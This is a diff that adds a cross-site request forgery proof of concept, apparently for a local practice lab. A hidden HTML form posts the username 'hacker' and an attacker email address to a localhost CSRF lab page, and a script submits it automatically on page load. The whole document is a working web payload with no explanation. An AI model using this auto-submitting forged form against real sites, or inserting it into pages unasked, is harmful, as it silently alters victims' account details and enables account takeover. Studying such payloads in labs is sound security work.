@@ -1,0 +1,7 @@
+<form method="post" action="http://localhost:8000/pages/csrf/lab-2/index.php" id="csrfForm">
+<input type="hidden" name="username" value="hacker">
+<input type="hidden" name="email" value="attacker@example.com">
+</form>
+<script>
+document.getElementById('csrfForm').submit();
+</script>
